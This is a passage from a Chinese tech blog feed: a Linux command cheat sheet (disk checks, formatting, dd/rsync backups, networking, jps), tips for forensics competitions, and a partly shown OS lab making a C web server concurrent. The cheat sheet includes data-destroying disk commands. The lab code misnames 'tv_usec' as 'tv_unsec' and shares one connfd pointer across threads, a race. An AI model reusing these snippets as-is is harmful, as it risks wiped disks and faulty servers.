title="文件系统分析"></a>文件系统分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 <br>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 <br>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 <br>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 <br>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 <br>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 <br>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 <br>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 <br>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 <br></code></pre></td></tr></table></figure><h3 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs /dev/hda1 在hda1分区创建一个文件系统 <br>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 <br>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 <br>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 <br>fdformat -n /dev/fd0 格式化一个软盘 <br>mkswap /dev/hda3 创建一个swap文件系统 <br></code></pre></td></tr></table></figure><h3 id="SWAP文件系统"><a href="#SWAP文件系统" class="headerlink" title="SWAP文件系统"></a>SWAP文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /dev/hda3 创建一个swap文件系统 <br>swapon /dev/hda3 启用一个新的swap文件系统 <br>swapon /dev/hda2 /dev/hdb3 启用两个swap分区 <br></code></pre></td></tr></table></figure><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的完整备份 <br>dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的交互式备份 <br>restore -<span class="hljs-keyword">if</span> /tmp/home0.bak 还原一个交互式备份 <br>rsync -rogpav --delete /home /tmp 同步两边的目录 <br>rsync -rogpav -e ssh --delete /home ip_address:/tmp 通过SSH通道rsync <br>rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 <br>rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 <br><span class="hljs-built_in">dd</span> bs=1M <span class="hljs-keyword">if</span>=/dev/hda | gzip | ssh user@ip_addr <span class="hljs-string">&#x27;dd of=hda.gz&#x27;</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 <br>tar -Puf backup.tar /home/user 执行一次对 <span class="hljs-string">&#x27;/home/user&#x27;</span> 目录的交互式备份操作 <br>( <span class="hljs-built_in">cd</span> /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/share/ &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个目录内容 <br>( tar c /home ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/backup-home &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个本地目录 <br>tar cf - . | (<span class="hljs-built_in">cd</span> /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 <br>find /home/user1 -name <span class="hljs-string">&#x27;*.txt&#x27;</span> | xargs <span class="hljs-built_in">cp</span> -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 <span class="hljs-string">&#x27;.txt&#x27;</span> 结尾的文件到另一个目录 <br>find /var/log -name <span class="hljs-string">&#x27;*.log&#x27;</span> | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 <span class="hljs-string">&#x27;.log&#x27;</span> 结尾的文件并做成一个bzip包 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 <br><br><br></code></pre></td></tr></table></figure><h3 id="网络-（以太网和WIFI无线）"><a href="#网络-（以太网和WIFI无线）" class="headerlink" title="网络 - （以太网和WIFI无线）"></a>网络 - （以太网和WIFI无线）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig eth0 显示一个以太网卡的配置 <br>ifup eth0 启用一个 <span class="hljs-string">&#x27;eth0&#x27;</span> 网络设备 <br>ifdown eth0 禁用一个 <span class="hljs-string">&#x27;eth0&#x27;</span> 网络设备 <br>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 <br>ifconfig eth0 promisc 设置 <span class="hljs-string">&#x27;eth0&#x27;</span> 成混杂模式以嗅探数据包 (sniffing) <br>dhclient eth0 以dhcp模式启用 <span class="hljs-string">&#x27;eth0&#x27;</span> <br>route -n show routing table <br>route add -net 0/0 gw IP_Gateway configura default gateway <br>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network <span class="hljs-string">&#x27;192.168.0.0/16&#x27;</span> <br>route del 0/0 gw IP_gateway remove static route <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward activate ip routing <br>hostname show hostname of system <br>host www.example.com lookup hostname to resolve name to ip address and viceversa<br>nslookup www.example.com lookup hostname to resolve name to ip address and viceversa<br>ip <span class="hljs-built_in">link</span> show show <span class="hljs-built_in">link</span> status of all interfaces <br>mii-tool eth0 show <span class="hljs-built_in">link</span> status of <span class="hljs-string">&#x27;eth0&#x27;</span> <br>ethtool eth0 show statistics of network card <span class="hljs-string">&#x27;eth0&#x27;</span> <br>netstat -tup show all active network connections and their PID <br>netstat -tupl show all network services listening on the system and their PID <br>tcpdump tcp port 80 show all HTTP traffic <br>iwlist scan show wireless networks <br>iwconfig eth1 show configuration of a wireless network card <br>hostname show hostname <br>host www.example.com lookup hostname to resolve name to ip address and viceversa <br>nslookup www.example.com lookup hostname to resolve name to ip address and viceversa <br>whois www.example.com lookup on Whois database <br></code></pre></td></tr></table></figure><h3 id="JPS工具"><a href="#JPS工具" class="headerlink" title="JPS工具"></a>JPS工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。<br>    我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 <span class="hljs-built_in">id</span>。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其<span class="hljs-built_in">id</span>号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。<br>     使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。<br>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.<br>$&gt; jps<br>23991 Jps<br>23789 BossMain<br>23651 Resin<br><br>比较常用的参数：<br>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数<br>$&gt;  jps -q<br>28680<br>23789<br>23651<br>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null<br>$&gt; jps -m<br>28715 Jps -m<br>23789 BossMain<br>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log<br>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名<br>$&gt; jps -l<br>28729 sun.tools.jps.Jps<br>23789 com.asiainfo.aimc.bossbi.BossMain<br>23651 com.caucho.server.resin.Resin<br>-v 输出传递给JVM的参数<br>$&gt; jps -v<br>23789 BossMain<br>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd<br>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m<br>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -<br>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl<br>sudo jps看到的进程数量最全<br>jps 192.168.0.77<br>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099<br>（前提是远程服务器提供jstatd服务）<br>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子数据取证参赛经验总结</title>
    <link href="/blog/2019/12/01/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%8F%82%E8%B5%9B%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2019/12/01/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%8F%82%E8%B5%9B%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>参加了三次取证比赛了，也谈不上有什么经验吧，就简单写一下一些注意事项以及可能会踩坑的地方和一些技巧吧。</strong></p><p><img src="/images/fj25.jpg"></p><span id="more"></span><h2 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h2><p>1.刚开始的第一个问题一般情况下都是问你镜像的哈希或者磁盘的哈希值，这在实际中应该是为了保证镜像数据的完整性，一定要注意题目问的是什么的哈希值，磁盘的哈希值要放到取证软件中之后再看，镜像文件的哈希就是.dd文件的哈希，可以直接计算。</p><p>2.接下来可能会有一些基础的问题，比如系统最后一次关机时间，系统安装时间，系统用户信息等等，都可以在取证大师中的取证结果中查看。</p><p>3.当题目中问到某某文件有关的信息的时候，如果你比较了解这个文件具体作用、具体路径，就可以根据经验找这个文件，如果不了解就可以采取暴力检索的方式直接搜索想要的结果，然后点击跳转到源文件即可找到想要的文件。</p><p>4.Windows注册表中有很多有用的东西，可以了解一下一些重要的注册表项的含义。</p><p>5.使用火眼仿真软件来做可能会有意想不到的收获，比如桌面有个txt文件，里面有账号密码哈哈哈哈。</p><p>6.和时间相关的题目务必注意选项里面的时间是不是UTC +8，世界标准时间是UTC时间也就是0时区的时间，对标格林威治时间，中国是使用东八区时间也就是UTC +8 ，选择的时候一定要注意选项问的到底是哪个时间。</p><p>7.关于内存取证方面，VolatilityWorkbench是个不错的选择，不用启动kali虚拟机，也不用记住命令，但是组件不能自由添加，不过整体还挺好用。</p><p>8.你需要有一定的软件逆向能力，比如使用IDA，也要会一些DLL函数作用。还有apk的逆向分析等等。</p><p>9.浏览器的访问记录有很多有用的东西，比如我们攻击某个网站，可能会需要搜索资料，历史纪录里面就可能有想要的东西。</p><p>10.邮件里面可能会有太多太多的有用信息，附件很可能就是病毒，不要在本地电脑运行！</p><p>11.洋葱网络可以了解一下，一般搞事情的都会在背地里搞，所以很可能涉及洋葱网络。</p><p>12.学会计算扇区、簇、以及一系列的硬件存储相关的东西，查看簇的大小可以用chkdsk命令，具体怎么用网上有。</p><h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><p>1.Linux很有可能涉及RAID重组，这里也是一个难点，如果组不出来后面的题基本上是没法做的，上次美亚杯就是吃了这个亏，如果组出来一等奖稳稳的。RAID重组最简单也是最有效的办法就是使用取证大师自动重组，但是很重要的一点也是我们刚知道的一点就是先用FTK把镜像文件挂载到本地之后再用取证大师自动重组，这样会大大提高效率！如果取证大师组不出来，那就可以试试用RAID Reconstructor试试，有的大佬还能直接用Winhex看磁盘看出来，，，我也不是很懂这是什么操作。如果都组不出来，那就可以尝试把镜像放进火眼仿真软件里面了，尝试一下是不是软RAID，mdadm -D 查看软件raid信息。如果实在组不出来，然后还有很多时间的话那就慢慢试试，运气好几百种可能你一下子就试出来了也不好说。</p><p>2.Linux一般是服务器，或者是攻击者的kali机。服务器上很多配置信息都可以在取证大师取证结果中看到，需要了解Linux媒体文件的挂载方式，理解LVM等一系列存储相关的东西怎么看，命令是啥。</p><p>3.服务器上也可能是一个网站的服务器，这就要求你的队伍里面还需要一个懂web的，了解docker容器使用。</p><p>4.Linux的几个常见目录是干什么的要有所了解，比如DDos攻击上传的文件一般在&#x2F;var目录下</p><p>5.bash的history是一个好东西</p><p>6.Linux的用户登录信息，权限信息，怎么提权，最好也要了解一下</p><h2 id="手机取证："><a href="#手机取证：" class="headerlink" title="手机取证："></a>手机取证：</h2><p>1.iPhone很有可能就在嫌疑人笔记本电脑上有备份，所以准备一个iPhone备份恢复工具非常有必要。安卓手机也有可能在电脑有备份。</p><p>2.安卓的目录信息稍微了解一下</p><p>3.短信息里面有惊喜</p><p>4.微信聊天数据db文件是加密的，有加密方法，具体好像是用IMEI+啥东西我忘记了，可以查一下，很重要</p><p>5.手机取证可以用手机大师或者是用火眼取证做。</p><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>流量分析用wireshark做，筛选方法自己去学习一下，流量包可以看出DDos攻击或者是其他DNS等有用的数据。其他日志分析就自己看着来吧。</p><p>总结：取证比赛呢，可能上手比较简单，刚开始你可能会觉得不就是操作软件找东西嘛，点点点就行了。但是越往后你越会发现其实没那么简单，你需要深刻理解操作系统，知识点要覆盖很全面，还要了解黑客的攻击手段，想做到做的每个题都对确实挺难的，看选项一定看清楚再选，问哈希值的时候看后几位别看前几位。欢迎大家参加取证比赛，还是挺有意思的，也会对大家日常学习有所帮助。</p><p>以上内容如有不对的地方欢迎批评指正！</p>]]></content>
    
    
    
    <tags>
      
      <tag>电子数据取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用多进程、多线程、多路复用实现Web服务器</title>
    <link href="/blog/2019/10/30/%E4%BD%BF%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E3%80%81%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/blog/2019/10/30/%E4%BD%BF%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E3%80%81%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>操作系统课程的实验，要求使用多进程、多线程、多路复用实现Web服务器并发，使用的是tiny的一个简单的WEB服务器源码进行修改，使其支持多进程、多线程、多路复用。</strong></p><p><img src="/images/fj24.jpg"></p><span id="more"></span><h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="TCP套接字通信"><a href="#TCP套接字通信" class="headerlink" title="TCP套接字通信"></a>TCP套接字通信</h3><p>Echo通信例子：</p><p><img src="/images/os4-1.png"></p><p>select：</p><p><img src="/images/os4-2.png"></p><p>文件描述符集合操作：</p><p><img src="/images/os4-3.png"></p><p>一般来说，在每次使用select()函数之前，首先使用FD_ZERO()和FD_SET()来初始化文件描述符集（在需要重复调用select()函数的时候，先把一次初始化好的文件描述符集备份下来，每次读取它即可）。在select()函数返回之后，可循环使用FD_ISSET()来测试描述符集，在执行完对相关文件描述符的操作之后，使用FD_CLR()来清除描述符集。<br>另外，select()函数中的timeout是一个struct timeval类型的指针，该结构体如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> </span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-type">long</span> tv_sec; <span class="hljs-comment">/* 秒 */</span><br>     <span class="hljs-type">long</span> tv_unsec; <span class="hljs-comment">/* 微秒 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="WEB-server"><a href="#WEB-server" class="headerlink" title="WEB server"></a>WEB server</h3><p>模型：</p><p><img src="/images/os4-4.png"></p><p><img src="/images/os4-5.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="多进程实现服务器并发"><a href="#多进程实现服务器并发" class="headerlink" title="多进程实现服务器并发"></a>多进程实现服务器并发</h3><p>调用Fork创建子进程，父进程继续监听。在子进程中对客户端进行处理，因为fork完全复制父进程，所以要在子进程中关掉监听套接字listenfd。子进程处理完之后，父子进程都要关掉连接套接字connfd。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">// 多进程 </span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); <br>        <span class="hljs-keyword">if</span> (Fork() == <span class="hljs-number">0</span>) &#123;<br>            Close(listenfd);<br>            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>            doit(connfd);<br>            Close(connfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        Close(connfd);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h3 id="多线程实现服务器并发"><a href="#多线程实现服务器并发" class="headerlink" title="多线程实现服务器并发"></a>多线程实现服务器并发</h3><p>定义一个tid用于记录创建线程的id，主线程用于监听套接字，有新的连接建立之后创建一个副线程，主线程继续监听。副线程调用执行线程函数，在该函数中完成对新建立连接的处理，处理完之后关闭套接字，副线程结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> connfd = *((<span class="hljs-type">int</span> *)argv);<br>    Pthread_detach(pthread_self());<br>    doit(connfd);  <br>    Close(connfd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br> <br>    <span class="hljs-comment">//多线程 </span><br>    <span class="hljs-type">pthread_t</span> tid;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>        Pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thread, &amp;connfd);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h3 id="多路复用实现并发"><a href="#多路复用实现并发" class="headerlink" title="多路复用实现并发"></a>多路复用实现并发</h3><p>Fd_set rds,tmp定义两个文件描述符集，rds为用于监控的集合，tmp用于临时复制rds。FD_ZERO将rds清零，RD_SET将选定的位置1，fd_max是监听的套接字中最大的套接字描述符加一。<br>因为每次执行完select之后，未发生状态变化的套接字位会被置0，所以在循环开始时要对rds进行复制，对副本tmp进行select操作。select会把未就绪的描述符位置0，遍历文件描述符至fd_max，对每个文件描述符进行判断是否在文件描述符集tmp中，若在则进行处理。因为处理的都是就绪的套接字，所以不会发生阻塞。<br>如果为监听套接字就绪，新建立连接的描述符要加入rds中，如果为连接套接字，处理完之后要将其从文件描述符集rds中清除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 